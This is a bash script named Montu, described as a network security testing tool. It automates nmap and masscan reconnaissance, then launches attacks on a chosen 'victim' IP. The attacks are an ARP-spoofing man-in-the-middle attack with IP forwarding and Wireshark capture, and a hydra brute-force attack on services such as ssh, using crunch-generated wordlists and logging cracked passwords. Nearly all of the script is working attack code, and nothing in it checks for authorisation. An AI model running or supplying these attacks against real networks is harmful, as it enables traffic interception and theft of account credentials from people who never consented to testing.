#!/bin/bash

# Author: Horus

# Date created: 22/08/2022

# Last Modded: 28/08/2022

# Description: A script that runs different cyber attacks to test a network, then logs information such as
# 			   Date, Time, target IPs, as well as the types of attacks used.

# ---------------------------------------COLOUR LIST------------------------------------------------------------------

NC='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
#-------------------------------------FILE PATHS---------------------------------------------------------------

sting_PATH="/var/log/Montu/Montu_logs/sting_scans"
nmap_PATH="/var/log/Montu/Montu_logs/manual_Nmap_scans"
masscan_PATH="/var/log/Montu/Montu_logs/manual_Masscan_scans"

mitm_PATH="/var/log/Montu/Montu_logs/attack_logs/MitM_logs"
brute_PATH="/var/log/Montu/Montu_logs/attack_logs/Brute_logs"
brute_pass_PATH="/var/log/Montu/Montu_logs/attack_logs/Brute_logs/password_lists"
brute_pass_custom_PATH="/var/log/Montu/Montu_logs/attack_logs/Brute_logs/password_lists/Crunch_Montu_Custom.txt"
brute_pass_charset_PATH="/var/log/Montu/Montu_logs/attack_logs/Brute_logs/password_lists/Crunch_Montu_Charset.txt"
msf_PATH="/var/log/Montu/Montu_logs/attack_logs/MSF_logs"

#--------------------------------------START OF DIRECTORY CHECK-------------------------------------------------


function dircheck()
{
	cd /var/log
	mkdir -p Montu
	cd Montu
	mkdir -p Montu_logs
	cd Montu_logs
	mkdir -p sting_scans
	mkdir -p manual_Nmap_scans
	mkdir -p manual_Masscan_scans
	mkdir -p attack_logs
	cd attack_logs
	mkdir -p MitM_logs
	mkdir -p Brute_logs
	mkdir -p MSF_logs
	cd Brute_logs
	mkdir -p password_lists
	cd
}

#--------------------------------------START OF APPLICATIONS CHECK-------------------------------------------------

function appcheck()
{
	apps=("masscan" "nmap" "dsniff" "hydra" "figlet" "wireshark" "gnome-terminal" "crunch")
	
	echo -e "${Cyan}Proceeding with automatic update and upgrade of current systems...${NC}\n"
	sleep 1
	sudo apt-get install && sudo apt-get upgrade -y
	sleep 1
	echo -e "${Cyan}Updates and Upgrades complete.${NC}\n"
	sleep 1
	
	echo -e "${Yellow}Essential applications for this script to work:${NC}\n"
	
	for tools in ${apps[@]}
	do
		echo $tools
		chk=$(command -v $tools)
		echo -e "${chk}"
		
		if [ -z $chk ]
		then
			echo -e "${Red}This app is not installed!${NC}\n"
			sleep 1
			echo -e "conducting installation now..."
			sudo apt-get install $tools -y
			echo ""
			
		else
			echo -e "${Green}installed!${NC}\n"
			sleep 1
			
		fi
	done
	
	echo -e "All necessary applications installed.\nProceeding with Phase 2 - Scanner\n"
}

#--------------------------------------SCAN FUNCTION-------------------------------------------------
# This function evolved while writing the script. It works more a s main menu to operate from. From this menu, users can jump straight into the logs, or straight into the attack menu.
function scan_mode()
{
		echo -e "${Blue}--------MAIN MENU--------${NC}"
		echo -e "Choose a scanning option:\n"
		echo -e "Sting - scans the current network\nManual - For scanning networks that you aren't connected to or when specific ports need to specified\nAttack-mode - proceeds straight into the Attack Menu"
		echo ""
		
		select scantype in sting_scan manual attack_mode logs quit
		
		do
			case $scantype in
			
			sting_scan) 
				echo -e "${Yellow}Sting option selected${NC}"
				sleep 0.5
				echo -e "obtaining current network details"
				net_sig=$(ip r | grep kernel | awk '{print $1}')
				echo -e "Identified: ${Green}$net_sig${NC}"
				nmap "$net_sig" -oG Grepped
				cat Grepped >> "$sting_PATH"/sting_scans.log
				echo -e "${Red}-------------------ABOVE IS BASIC SCAN GREP--------------------------------${NC}" >> "$sting_PATH"/sting_scans.log
				mv Grepped "$sting_PATH"
				clear
				#command below assigns all the IP addresses inside the Grepped nmap file to an array. which allows for them to be used for selection in the next phase.
				IFS=$'\n' read -r -d '' -a IP_array < <(cat "$sting_PATH"/Grepped | grep Host | awk '{print $2}' | sort | uniq && printf '\0' )
				echo ""
				echo -e "Live Hosts on the network identified.\n${Cyan}Nmap scan sent to sting log file. ${NC}"
				echo -e "IP List"
				for ip_list in ${IP_array[@]}
				do
					echo -e "${Green}$ip_list${NC}"
				done
				echo -e "\n${Yellow}Further enumeration recommended.${NC}" #The option to further enumerate allows the user to pick any of the live IPs and run a more detailed scan using the -O and -sV flags
				# to identify service version and OS. The more aggressive scan is offered after the live IPs have been identified so as to asve time during scanning.
				echo -e "select an IP to ${Cyan}further enumerate${NC}, select ${Blue}Logs${NC} to view the logs, or select ${Yellow}skip${NC} to navigate to the attack menu"
				select further_enum in ${IP_array[@]} skip logs
				do
					if [ $further_enum == "skip" ]
					then
						attack_menu
					
					elif [ $further_enum == "logs" ]
					then
						echo -e "${Yellow}Navigating to log menu now...${NC}"
						log_menu
					
					else
						echo -e "you have chosen to further enumerate ${Green}$further_enum${NC}.\n${Cyan}Conducting scan now...${NC}"
						nmap -O -sV "$further_enum" >> "$sting_PATH"/sting_scans.log
						echo -e "${Red}-------------------------------------ABOVE IS HARD ENUM--------------------------------------${NC}" >> "$sting_PATH"/sting_scans.log
						echo -e "${Cyan}Scan complete!${NC}"
						echo -e "${Cyan}Re-select target for further enum${NC}, naviagte to ${Blue}Logs${NC}, or select option to ${Yellow}skip to the attack menu.${NC}"
					fi
				done
				
					
			
						
			;;
			
			manual)
				echo -e "This is the ${Yellow}manual option${NC}"
				echo -e "Which scanner would you like to use?\n${Cyan}Nmap is ideal for single or few targets${NC}\n${Green}Masscan is ideal for large networks, albeit at the cost of accuracy.${NC}"
				select scanmethod in nmap masscan
				do
					case $scanmethod in
					
					nmap)
						#move to manualnmapfunction
						man_nmap
					;;
					
					masscan)
						#move to manualmasscan function
						man_masscan
					;;
					
					*)
						echo -e "${Red}invalid option, returning to main menu.${NC}"
						echo ""
						scan_mode
					;;
					esac
				done
				
			;;
			
			attack_mode)
				echo -e "Proceeding to the ${Red}attack menu${NC}."
				attack_menu
			;;
			
			logs)
				echo -e "${Yellow}Navigating to log folder.${NC}"
				log_menu
				#insert log folder navigation here
			;;
			
			quit)
				echo -e "${Red}QUITTING...${NC}"
				echo -e "Thank you for using Montu!" | figlet -f pagga
				sleep 1
				exit
			;;
			
			esac
		done
	
}

#--------------------------------------ATTTACK MENU-------------------------------------------------
# This function brings user to a screen where they can choose what type of attack they would like to run.
function attack_menu()
{
		echo -e "${Yellow}--------------------------------------------------------------------------${NC}\nWelcome to the ${Yellow}Attack Menu${NC} of Montu.\nPlease select or the ${Green}IP address${NC} of the ${Red}victim device${NC}.\nIf there are ${Yellow}no selectable targets${NC}, Please input one ${Yellow}manually${NC}\nAlternatively, select ${Cyan}'menu'${NC} to return to the main menu:"
		echo -e "${Cyan}Running a Sting Scan${NC} will add target options to this menu!"
		select victim in ${IP_array[@]} menu manual_type
		do
			if [[ $victim == "menu" ]]
			then
				echo -e "${Blue}Returning to main menu now.${NC}\n"
				sleep 1.5
				scan_mode
			
			elif [[ $victim == "manual_type" ]]
			then
				echo -e "Please enter IP address of victim: "
				read victim
				echo -e "Please select your ${Yellow}preferred Attack Vector${NC}:"
				select vector in MitM Bruteforce main
				do
					case $vector in
					
					MitM)
						#Move to MitM function
						Middle_Man
					;;
					
					Bruteforce)
						#Move to Bruteforce function
						brute
					;;
					
					
					main)
						echo -e "${Red}Returning to main menu...${NC}"
						scan_mode
					;;
					
					
					
					esac
				
				done
				sleep 0.5 
			
			else
				#for the array for loop
				for victim_check in ${IP_array[@]}
				do
					if [[ $victim_check == $victim ]]
					then
						echo -e "You have chosen to attack ${Green}$victim${NC}"
						
						echo -e "Please select your ${Yellow}preferred Attack Vector${NC}:"
						select vector in MitM Bruteforce main
						do
							case $vector in
							
							MitM)
								#Move to MitM function
								Middle_Man
							;;
							
							Bruteforce)
								#Move to Bruteforce function
								brute
							;;
							
							
							main)
								echo -e "${Red}Returning to main menu...${NC}"
								scan_mode
							;;
							
							
							
							esac
						
						done
						sleep 0.5 
						
					fi
				done
				
			fi
		done
}

#--------------------------------------ROOT CHECK-------------------------------------------------
# Root's EUID value is 0. So if it is not 0, the user is not running the script as root. This is important as certain scans and attacks can only be run as root.
function root_chk()
{
	if [ $EUID -ne 0 ]
	then 
		echo -e "Please run this script as root!"
		exit
	fi
	
}

#--------------------------------------MANUAL NMAP-------------------------------------------------
# Function to input specific values and ports for nmap scan
function man_nmap()
{
		echo -e "You have selected ${Yellow}Manual Input Nmap${NC}"
		echo -e "Please enter the ${Green}target IP address / IP address range${NC} you would like to scan.\nNote that this scan only accepts Singular IPs or ranges of IPs with hyphens in the necessary octets."
		read -r nmanualIP
		echo -e "Please enter the port(s) or port ranges you would like to scan. Separate ports with a comma, or if using a range, use a hyphen. If left empty, the most common ports will be used. ${Yellow}Leave blank for UDP port scan.${NC}"
		read -r nmanualport
		if [ -z "$nmanualport" ] #this if statement ensures that if no port is specified, the port variable will automatically be assigned the top 1000 most common ports, similar to a default scan.
		then
			nmanualport="1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389"
		fi
		echo -e "Please select one of the following flags:"
		select flag_choice in Aggressive Script_scan_vuln UDP_scan main
		do
			case $flag_choice in
			
			Aggressive)
				echo -e "You have selected the ${Red}Aggressive scan.\nRunning Aggressive scan now.${NC}"
				echo -e "${Red}----Aggressive scan. Flags used: -A ------${NC}" >> "$nmap_PATH"/manualnmapscans.log
				nmap "$nmanualIP" -p"$nmanualport" -A -oN "$flag_choice"_$(date +%s) >> "$nmap_PATH"/manualnmapscans.log
				echo -e "${Red}---------------------------------------------------------${NC}" >> "$nmap_PATH"/manualnmapscans.log
				echo -e "${Green}Scan complete.${NC}\nScan can be found in the nmap manual logs, which can be access via the main menu."
				echo -e "${Cyan}Select another flag type or returm to the main menu with 4.${NC}"
			;;
			
			Script_scan_vuln)
				echo -e "You have selected the ${Yellow}Script Scan for vulnerabilties.\nRunning Script Scan now. This may take a while.${NC}"
				echo -e "${Yellow}----Script Scan scan. Flags used: -Pn, --script vuln ------${NC}" >> "$nmap_PATH"/manualnmapscans.log
				nmap "$nmanualIP" -p"$nmanualport" --script vuln -oN "$flag_choice"_$(date +%s) >> "$nmap_PATH"/manualnmapscans.log
				echo -e "${Red}---------------------------------------------------------${NC}" >> "$nmap_PATH"/manualnmapscans.log
				echo -e "${Green}Scan complete.${NC}\nScan can be found in the nmap manual logs, which can be access via the main menu."
				echo -e "${Cyan}Select another flag type or returm to the main menu with 4.${NC}" 
			;;
			
			UDP_scan)
				echo -e "You have selected the ${Cyan}UDP scan option. This will scan the top 250 UDP ports.${NC}"
				echo -e "${Yellow}----UDP Scan. Flags used: -sU, -top-ports ------${NC}" >> "$nmap_PATH"/manualnmapscans.log
				nmap "$nmanualIP" -sU -top-ports 250 -oN "$flag_choice"_$(date +%s) >> "$nmap_PATH"/manualnmapscans.log
				echo -e "${Red}---------------------------------------------------------${NC}" >> "$nmap_PATH"/manualnmapscans.log
				echo -e "${Green}Scan complete.${NC}\nScan can be found in the nmap manual logs, which can be access via the main menu."
				echo -e "${Cyan}Select another flag type or returm to the main menu with 4.${NC}"
			;;
			
			main)
				echo -e "Returning to main menu..\n"
				scan_mode
			;;
			
			
			esac
		done
	
}

#--------------------------------------MANUAL MASSCAN-------------------------------------------------
# Function to input chosen values and ports using masscan
function man_masscan()
{
	echo -e "You have selected ${Cyan}Masscan${NC} as your scanner of choice"
	echo -e "Please enter the range of IPs that you would like to scan.[e.g IP addr-IP addr]\nWhile single target scanning is possible with masscan, it is recommended to use Nmap for that purpose."
	read -r manscanIP
	echo -e "${Cyan}Please specify the ports/port range you would like to scan. [e.g 22,25 OR 22-25 OR 22]${NC}"
	read -r manscanport
	echo -e "${Blue}----Masscan. Flags used: NA ------${NC}" >> "$masscan_PATH"/manual_masscan.log
	masscan "$manscanIP" -p "$manscanport" -oG masscan_list_$(date +%s) >> "$masscan_PATH"/manual_masscan.log
	echo -e "${Red}---------------------------------------------------------${NC}" >> "$masscan_PATH"/manual_masscan.log
	echo -e "${Green}masscan completed and stored in masscan log file, returning to main menu..${NC}\n"
	sleep 1
	scan_mode
}

#--------------------------------------MITM ATTACK-------------------------------------------------
# This function first identifies the default gateway's IP address. Then it uses the specified victim's IP address as well. With these two pieces of information, the function then runs.
# First it sends the echo 1 message to the ipforwarding folder.
# Then it launches 3 windows, on gnome-terminal, executing commands on each of them.
# Terminal 1 launches wireshark
# Terminal 2 runs arpspoof with the default gateway as the target
# Terminal 3 runs arpspoof with the victim device as the target
# This way, the arpspoof attack is immediately conducted with the click of a button, as well as a monititoring software to log the attack immediately.
function Middle_Man()
{
		echo -e "You have chosen to conduct an ${Red}MitM attack${NC} on ${Green}$victim${NC}. Ensure that you are in the ${Yellow}SAME network as target${NC}."
		default_gateway=$(ip r | grep default| awk '{print $3}' | sort | uniq) #the sot | uniq here is very important, as some virtual devices will double print 
		#the default gateway line with 'ip r' command.
		
		echo -e "The default gateway is ${Cyan}$default_gateway${NC}"
		echo -e "The victim's IP is ${Green}$victim${NC}"
		echo -e "All info necessary for the attack is ready.\nWould you like to proceed? [y/n]"
		read mitm_proceed
		if [ $mitm_proceed == "y" ]
		then
			echo -e "${Yellow}Initiating wireshark window and running arpspoof attack on target now.${NC}\n"
			echo -e "MitM attack conducted on $(date +%D) at $(date +%T) on ${Green}$victim${NC}" >> "$mitm_PATH"/MitM.log
			echo -e "${Red}-----------------------------wireshark pcaps for the attack located wherever user has saved them-------------------------------------------${NC}" >> "$mitm_PATH"/MitM.log
			sudo echo 1 > /proc/sys/net/ipv4/ip_forward
			sudo gnome-terminal --window -- bash -c "sudo wireshark -i eth0"
			sudo gnome-terminal --window -- bash -c "sudo arpspoof -t $default_gateway $victim" 
			sudo gnome-terminal --window -- bash -c "sudo arpspoof -t $victim $default_gateway"
			attack_menu
			
			

		elif [ $mitm_proceed == "n" ]
		then
			echo -e "Returning to attack menu.\n"
			attack_menu
			
		else
			echo -e "${Red}Invalid option, try again!${NC}\n"
			Middle_Man
		fi
}

#--------------------------------------BRUTE FORCE ATTACK-------------------------------------------------
# This function collects some info to decide what kinf of flags it needs to use. First it collects info on the service being targeted (e.g ssh,ftp,etc...), then it asks the user if the target user is known.
# If not, it will request for a filepath to a username list that it can use. It will also ask the user if they would like to user the passsword list they generated through Montu or if they would like to specify
# their own filepath. This way, if the user has their own password list, they can use it with the program. After all this is collected, the script will run ahydra command based on the options selected.
function brute()
{
		
		echo -e "You have chosen to perform a ${Yellow}Bruteforce${NC} attack on ${Green}$victim${NC}"
		echo -e "Before proceeding, it is recommended you have a password list on hand.\nYou may ${Cyan}create one${NC} with crunch OR\nIf you have just returned from generating a list, OR if you have ${Purple}YOUR OWN LIST${NC}, go ahead and select 'proceed'!"
		
		select pass_gen in crunch proceed atk_menu
		do
			case $pass_gen in
			
			crunch)
				#move to crunch function
				pass_gen_crunch
			;;
			
			proceed)
				echo -e "${Green}Initiating Hydra systems. Let's hope the Avengers don't hear us.${NC}"
				echo -e "what is the ${Cyan}target service${NC} you would like to bruteforce? [e.g ssh, ftp, etc.]"
				read brute_target_service
				
				echo -e "${Yellow}Do you know${NC} the username of ${Green}$victim${NC}? [y/n]"
				read user_know
				
				
				if [ "$user_know" == "y" ]
				then
					echo -e "Please ${Cyan}enter the username${NC} for ${Green}$victim${NC}:"
					read username_brute
					
					echo -e "Are you using a password-list you generated through Montu? [y/n] "
					read montupass_or_other
					
					if [ $montupass_or_other == "y" ]
					then
						echo -e "Was it a custom or a charset list?"
						
						select custom_charset in custom charset
						do
							case $custom_charset in
								
							custom)
								echo -e "Information collected. Running Hydra attack now...\n"
								hydra -l "$username_brute" -P "$brute_pass_custom_PATH" "$victim" "$brute_target_service" -vV -o Brute_Montu_cracked.txt
								mv Brute_Montu_cracked.txt $brute_PATH
								echo -e "cracked passwords moved to Brute Logs folder\nNavigating back to main menu...\n${Red}ENSURE TO SAVE THE LOG AS A NEW FILE OR IT WILL BE OVERWRITTEN THE NEXT TIME THIS IS RUN!${NC}"
								sleep 1
								scan_mode
							;;
							
							charset)
								echo -e "Information collected. Running Hydra attack now...\n"
								hydra -l "$username_brute" -P "$brute_pass_charset_PATH" "$victim" "$brute_target_service" -vV -o Brute_Montu_cracked.txt
								mv Brute_Montu_cracked.txt $brute_PATH
								echo -e "cracked passwords moved to Brute Logs folder\nNavigating back to main menu...\n${Red}ENSURE TO SAVE THE LOG AS A NEW FILE OR IT WILL BE OVERWRITTEN THE NEXT TIME THIS IS RUN!${NC}"
								sleep 1
								scan_mode
							;;
							
							*)
								echo -e "${Red}Invalid option, try again!${NC}" 
							;;
							esac
						
						done
					
					elif [ $montupass_or_other == "n" ]
					then
						echo -e "Please specify the filepath to the passlist:"
						read passlist_path
						
						echo -e "Information collected. Running Hydra attack now...\n"
						hydra -l "$username_brute" -P "$passlist_path" "$victim" "$brute_target_service" -vV -o Brute_Montu_cracked.txt
						mv Brute_Montu_cracked.txt "$brute_PATH"
						echo -e "cracked passwords moved to Brute Logs folder\nNavigating back to main menu...\n${Red}ENSURE TO SAVE THE LOG AS A NEW FILE OR IT WILL BE OVERWRITTEN THE NEXT TIME THIS IS RUN!${NC}"
						sleep 1
						scan_mode
					
					else
						echo -e "${Red}Invalid option selected, returning to brute start zone.${NC}"
						brute
						
					fi
					
				elif [ $user_know == "n" ]
				then
					echo -e "Please enter the ${Yellow}filepath to the user list${NC}:"
					read user_path
					
					echo -e "Are you using a password-list you generated now, through Montu? [y/n] "
					read montupass_or_other
					
					if [ $montupass_or_other == "y" ]
					then
						echo -e "Was it a custom or a charset list?"
						
						#If you chose to provide your own set of characters, select Custom. If you used the pregenerated charsets, select Charset.
						select custom_charset in custom charset
						do
							case $custom_charset in
								
							custom)
								echo -e "Information collected. Running Hydra attack now...\n"
								hydra -L "$user_path" -P "$brute_pass_custom_PATH" "$victim" "$brute_target_service" -vV -o Brute_Montu_cracked.txt
								mv Brute_Montu_cracked.txt $brute_PATH
								echo -e "cracked passwords moved to Brute Logs folder\nNavigating back to main menu...\n${Red}ENSURE TO SAVE THE LOG AS A NEW FILE OR IT WILL BE OVERWRITTEN THE NEXT TIME THIS IS RUN!${NC}"
								sleep 1
								scan_mode
							;;
							
							charset)
								echo -e "Information collected. Running Hydra attack now...\n"
								hydra -L "$user_path" -P "$brute_pass_charset_PATH" "$victim" "$brute_target_service" -vV -o Brute_Montu_cracked.txt
								mv Brute_Montu_cracked.txt $brute_PATH
								echo -e "cracked passwords moved to Brute Logs folder\nNavigating back to main menu...\n${Red}ENSURE TO SAVE THE LOG AS A NEW FILE OR IT WILL BE OVERWRITTEN THE NEXT TIME THIS IS RUN!${NC}"
								sleep 1
								scan_mode
							;;
							
							*)
								echo -e "${Red}Invalid option, try again!${NC}" 
							;;
							esac
						
						done
					
					elif [ $montupass_or_other == "n" ]
					then
						echo -e "Please specify the ${Yellow}filepath to the passlist${NC}:"
						read passlist_path
						
						echo -e "Information collected. Running Hydra attack now...\n"
						hydra -L "$user_path" -P "$passlist_path" "$victim" "$brute_target_service" -vV -o Brute_Montu_cracked.txt
						mv Brute_Montu_cracked.txt "$brute_PATH"
						echo -e "cracked passwords moved to Brute Logs folder\nNavigating back to main menu...\n${Red}ENSURE TO SAVE THE LOG AS A NEW FILE OR IT WILL BE OVERWRITTEN THE NEXT TIME THIS IS RUN!${NC}"
						sleep 1
						scan_mode
					
					else
						echo -e "${Red}Invalid option selected, returning to brute start zone.${NC}"
						brute
						
					fi
					
				else
					echo -e "${Red}Invalid option, try again!${NC}"
					brute
					
				fi		
			;;
			
			atk_menu)
				echo -e "Going back to attack menu: "
				attack_menu
			;;
			esac
		done
		
}

#--------------------------------------CRUNCH PASSWORD LIST GENERATION-------------------------------------------------
# This function allows the user to create a password list using crunch. After prompting the password length, the user can either choose to provide their own character list
# or use the charsets located in /usr/share/crunch/charset.lst. Using your own list will generate a "custom" list, whilst
# using a charset will create a "charset" list.
function pass_gen_crunch()
{
		echo -e "${Yellow}You have chosen to generate your password using Crunch!${NC}"
		echo -e "Please select a minimum length for the passwords:"
		read crunch_min
		echo -e "Please select a maximum length for the passwords: "
		read crunch_max
		echo -e "Would you like to use your own ${Yellow}CUSTOM${NC} set of characters [${Cyan}M${NC}] or select from the ${Yellow}CHARSET${NC} list[${Yellow}L${NC}]?"
		read crunch_charset_opt
		if [ $crunch_charset_opt == "M" ]
		then
			echo -e "Please enter the characters you would like to include in the password list:"
			read crunch_myset
			
			echo -e "${Green}All necessary info collected${NC}.\nGenerating Password list and outputting it to ${Cyan}'Crunch_Montu_Custom.txt'${NC} now."
			crunch $crunch_min $crunch_max $crunch_myset -o Crunch_Montu_Custom.txt
			mv Crunch_Montu_Custom.txt $brute_pass_PATH #Send this Brute_Log/Password_Lists
			brute
			
		elif [ $crunch_charset_opt == "L" ]
		then
			echo -e "${Cyan}Please select one of the following charset options:${NC}\nWhere\nnumeric - numbers only\nlalpha - lowercase alphabet\nmixalpha - Both uppercaase and lowercase letters\nsymbol14 - symbol characters\n"
			select crunch_charset in numeric lalpha lalpha-numeric mixalpha mixalpha-numeric-symbol14
			do
				echo -e "You have selected the ${Yellow}$crunch_charset${NC} charset"
				break
			done
			echo -e "${Green}All necessary info collected.${NC}\nGenerating Password list and outputting it to ${Cyan}'Crunch_Montu_Charset.txt'${NC} now."
			crunch $crunch_min $crunch_max -f /usr/share/crunch/charset.lst $crunch_charset -o Crunch_Montu_Charset.txt 
			mv Crunch_Montu_Charset.txt $brute_pass_PATH #send this to brute_log/password_lists
			brute
			
		else
			echo -e "${Red}You have chosen an invalid option. Redirecting to start of crunch menu.${NC}\n"
			pass_gen_crunch
		fi
}

#---------------------------------------LOG MENU FUNCTION------------------------------------------------
# This function navigates to the general log directory, to allow the user to cat the logs while using the script.

function log_menu()
{
	cd /var/log/Montu/Montu_logs
	whereme=$(pwd)
	echo -e "${Blue}-------LOG MENU-------${NC}\nYou are located in \n${Yellow}$whereme${NC}"
	
	echo -e "Which logs would you like to view?"
	select log_nav in sting manual_nmap manual_masscan attack_logs main
	do
		case $log_nav in
		sting)
			echo -e "${Cyan}Opening sting scan log file...${NC}"
			cat sting_scans/sting_scans.log 2>/dev/null || echo -e "${Red}No sting scan log exists.${NC}\n"
			log_menu
		;;
		
		manual_nmap)
			echo -e "${Cyan}Opening manual nmap scan log file...${NC}"
			cat manual_Nmap_scans/manualnmapscans.log 2>/dev/null || echo -e "${Red}No manual nmap scan log exists.${NC}\n"
			log_menu
		;;
		
		manual_masscan)
			echo -e "${Cyan}Opening manual masscan scan log file...${NC}"
			cat manual_Masscan_scans/manual_masscan.log 2>/dev/null || echo -e "${Red}No manual masscan scan log exists.${NC}\n"
			log_menu
		;;
		
		attack_logs)
			echo -e "${Cyan}Navigating to attack log menu...${NC}"
			#naviagte to attack log function
			attack_log_menu
		;;
		
		main)
			echo -e "Returning to main menu.."
			scan_mode
		;;
		
		esac
	
	done
	
}

#--------------------------------------ATTACK LOG MENU FUNCTION-------------------------------------------------
#This function naviagtes the user into the attack log directory, and is used to cat the different attack logs so that they can be viewed while using the script.
function attack_log_menu()
{
	cd /var/log/Montu/Montu_logs/attack_logs
	whereme=$(pwd)
	echo -e "You are located in \n${Yellow}$whereme${NC}"
	echo -e "Which of the attack logs would you like to view?"
	
	select atk_log_select in MitM_log Brute_log log_menu
	do
		case $atk_log_select in
		
		MitM_log)
			echo -e "${Cyan}Opening MitM log file...${NC}"
			cat MitM_logs/MitM.log 2>/dev/null || echo -e "${Red}No MitM log exists.${NC}\n"
			attack_log_menu
		;;
		
		Brute_log)
			echo -e "${Cyan}Opening BruteForce log file...${NC}"
			cat Brute_logs/Brute_Montu_cracked.txt 2>/dev/null || echo -e "${Red}No Brute log exists.${NC}\n"
			attack_log_menu
		;;
		
		log_menu)
			echo -e "Returning to log menu...\n"
			log_menu
		;;
		esac
	done
	
	
}

#--------------------------------------INTRO SCREEN FUNCTION-------------------------------------------------

function intro_screen()
{
	echo "MONTU" | figlet -f pagga 
	
	echo -e "${Yellow}Welcome to Montu!\nThe Network Security Testing Tool. This tool comes equipped with 2 scanners and 2 attack vectors, designed to test a network's security as well as a network's ability to detect attacks when they occur.\nLet's Dive in!\n${NC}"
	scan_mode
}


root_chk
dircheck
appcheck

intro_screen
scan_mode
attack_menu
